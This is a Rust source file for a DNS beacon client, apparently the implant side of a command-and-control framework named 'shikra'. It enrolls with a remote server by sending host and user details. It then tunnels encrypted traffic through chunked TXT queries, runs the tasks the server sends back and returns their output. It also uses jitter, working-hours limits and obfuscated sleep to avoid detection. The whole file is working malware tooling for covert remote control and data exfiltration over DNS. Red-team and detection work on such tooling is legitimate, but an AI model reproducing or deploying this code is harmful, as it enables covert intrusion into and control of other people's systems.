//! DNS beacon client: enroll then poll using TXT queries.
//!
//! Request payloads are chunked across query names:
//! `<txid>.<seq>.<total>.<base32 labels...>.<zone>`. The server ACKs each
//! chunk and returns the response body in the TXT answer to the final chunk.

use crate::{execute_task, AgentState};
use anyhow::{bail, Context, Result};
use prost::Message;
use shikra_crypto::channel::SessionKeys;
use shikra_crypto::kex::KeyPair;
use shikra_crypto::signing::{verify, Identity};
use shikra_proto::v1::{
    agent_message, AgentHeartbeat, AgentMessage, AgentResult, Architecture, CheckInRequest,
    CheckInResponse, Envelope, Platform, SessionKind,
};
use shikra_transport::dns;
use shikra_transport::profile::C2Profile;
use shikra_transport::wire;
use std::sync::Arc;
use std::time::Duration;
use tokio::net::UdpSocket;
use tokio::sync::Mutex;

const OP_ENROLL: u8 = 1;
const OP_POLL: u8 = 2;
/// Raw payload bytes carried by a single query name.
const CHUNK_BYTES: usize = 100;
const QUERY_TIMEOUT: Duration = Duration::from_secs(3);
const QUERY_ATTEMPTS: usize = 3;

#[derive(Debug, Clone)]
pub struct DnsConfig {
    pub server_addr: String,
    pub zone: String,
    pub server_identity: [u8; 32],
    pub enroll_token: String,
    pub profile: C2Profile,
    pub max_runtime_secs: Option<u64>,
}

/// Runs the DNS beacon loop.
pub async fn run_dns_beacon(config: DnsConfig) -> Result<()> {
    run_dns_beacon_notify(config, None).await
}

/// Like [`run_dns_beacon`], but signals `ready` after successful enrollment.
pub async fn run_dns_beacon_notify(
    config: DnsConfig,
    ready: Option<tokio::sync::oneshot::Sender<()>>,
) -> Result<()> {
    let socket = UdpSocket::bind("0.0.0.0:0")
        .await
        .context("failed to bind DNS beacon socket")?;
    socket
        .connect(&config.server_addr)
        .await
        .context("invalid DNS server address")?;

    let identity = Identity::generate();
    let kex = KeyPair::generate();
    let kex_public = kex.public_key();
    let signature = identity.sign(&wire::enroll_message(&kex_public));

    let checkin = CheckInRequest {
        identity_public: identity.public_key_bytes().to_vec(),
        kex_public: kex_public.to_vec(),
        identity_signature: signature.to_bytes().to_vec(),
        hostname: crate::hostname(),
        username: crate::username(),
        platform: current_platform(),
        architecture: current_architecture(),
        process_name: std::env::current_exe()
            .ok()
            .and_then(|path| path.file_name().map(|n| n.to_string_lossy().to_string()))
            .unwrap_or_default(),
        kind: SessionKind::Beacon as i32,
        enrollment_token: config.enroll_token.clone(),
        killdate_unix: crate::limits::get().killdate_unix,
        working_hours: crate::limits::get().working_hours.clone(),
    };

    let body = exchange(&socket, &config.zone, OP_ENROLL, &checkin.encode_to_vec()).await?;
    let checkin_response = CheckInResponse::decode(body.as_slice()).context("decode enroll")?;
    if checkin_response.session_id.starts_with("error:") {
        bail!("enrollment rejected: {}", checkin_response.session_id);
    }

    let server_kex_public: [u8; 32] = checkin_response
        .server_kex_public
        .as_slice()
        .try_into()
        .map_err(|_| anyhow::anyhow!("server kex public key has wrong length"))?;
    verify(
        &config.server_identity,
        &wire::checkin_response_message(
            &checkin_response.session_id,
            &kex_public,
            &server_kex_public,
        ),
        &checkin_response.server_signature,
    )
    .context("server identity verification failed")?;

    let shared = kex.diffie_hellman(&server_kex_public);
    let keys = SessionKeys::derive(&checkin_response.session_id, &shared, true)
        .context("session key derivation failed")?;
    let keys = Arc::new(Mutex::new(keys));

    tracing::info!(
        session = %checkin_response.session_id,
        transport = "dns",
        "beacon checked in"
    );
    if let Some(ready) = ready {
        let _ = ready.send(());
    }

    let mut agent_state = AgentState::default();
    let mut pending_results = crate::MaskedResults::new();
    let deadline = config
        .max_runtime_secs
        .map(|secs| tokio::time::Instant::now() + Duration::from_secs(secs));

    loop {
        if crate::limits::killdate_expired() {
            tracing::info!("killdate reached; exiting");
            std::process::exit(0);
        }
        if crate::limits::outside_working_hours() {
            tokio::time::sleep(Duration::from_secs(60)).await;
            continue;
        }
        if let Some(deadline) = deadline {
            if tokio::time::Instant::now() >= deadline {
                break;
            }
        }

        let message = match pending_results.take_batch() {
            Some(batch) => AgentMessage {
                body: Some(agent_message::Body::Results(batch)),
            },
            None => AgentMessage {
                body: Some(agent_message::Body::Heartbeat(AgentHeartbeat {
                    unix_ms: crate::current_unix_ms(),
                })),
            },
        };

        let envelope = {
            let mut keys = keys.lock().await;
            wire::seal_message(&mut keys, &message).context("seal poll")?
        };

        match exchange(&socket, &config.zone, OP_POLL, &envelope.encode_to_vec()).await {
            Ok(body) => {
                if let Ok(reply) = Envelope::decode(body.as_slice()) {
                    let opened = {
                        let mut keys = keys.lock().await;
                        wire::open_message(&mut keys, &reply).ok()
                    };
                    if let Some(opened) = opened {
                        if let Some(agent_message::Body::Tasks(batch)) = opened.body {
                            for task in batch.tasks {
                                let task_id = task.task_id.clone();
                                let outcome = execute_task(&mut agent_state, &task, None).await;
                                pending_results.push(AgentResult {
                                    task_id,
                                    exit_code: outcome.exit_code,
                                    stdout: outcome.stdout,
                                    stderr: outcome.stderr.into_bytes(),
                                });
                            }
                        }
                    }
                }
            }
            Err(err) => tracing::warn!(%err, "DNS poll failed"),
        }

        let jitter = if config.profile.jitter_secs > 0 {
            rand::random::<u64>() % config.profile.jitter_secs
        } else {
            0
        };
        crate::sleep_obfuscated(Duration::from_secs(
            config.profile.poll_interval_secs.max(1) + jitter,
        ))
        .await;
    }

    Ok(())
}

/// Sends one frame and returns the response body.
async fn exchange(socket: &UdpSocket, zone: &str, opcode: u8, payload: &[u8]) -> Result<Vec<u8>> {
    let mut frame = Vec::with_capacity(1 + payload.len());
    frame.push(opcode);
    frame.extend_from_slice(payload);

    let txid: u32 = rand::random();
    let chunks: Vec<&[u8]> = frame.chunks(CHUNK_BYTES).collect();
    let total = chunks.len();
    let mut response = Vec::new();

    for (seq, chunk) in chunks.iter().enumerate() {
        let labels = dns::payload_to_labels(chunk);
        let mut qname = format!("{txid:08x}.{seq}.{total}");
        for label in &labels {
            qname.push('.');
            qname.push_str(label);
        }
        if !zone.is_empty() {
            qname.push('.');
            qname.push_str(zone);
        }

        let mut last_err: Option<anyhow::Error> = None;
        let mut answered = false;
        for _ in 0..QUERY_ATTEMPTS {
            let id: u16 = rand::random();
            let query = dns::encode_query(id, &qname).context("encode DNS query")?;
            socket.send(&query).await.context("send DNS query")?;
            let mut buf = vec![0u8; 65_535];
            match tokio::time::timeout(QUERY_TIMEOUT, socket.recv(&mut buf)).await {
                Ok(Ok(len)) => {
                    let body = dns::decode_response(&buf[..len]).context("decode DNS response")?;
                    if seq + 1 == total {
                        response = body;
                    }
                    answered = true;
                    break;
                }
                Ok(Err(err)) => last_err = Some(err.into()),
                Err(_) => last_err = Some(anyhow::anyhow!("DNS query timed out")),
            }
        }
        if !answered {
            match last_err {
                Some(err) => return Err(err).context("DNS exchange failed"),
                None => bail!("DNS exchange failed"),
            }
        }
    }
    Ok(response)
}

fn current_platform() -> i32 {
    if cfg!(target_os = "windows") {
        Platform::Windows as i32
    } else if cfg!(target_os = "macos") {
        Platform::Macos as i32
    } else {
        Platform::Linux as i32
    }
}

fn current_architecture() -> i32 {
    if cfg!(target_arch = "aarch64") {
        Architecture::Aarch64 as i32
    } else {
        Architecture::X8664 as i32
    }
}
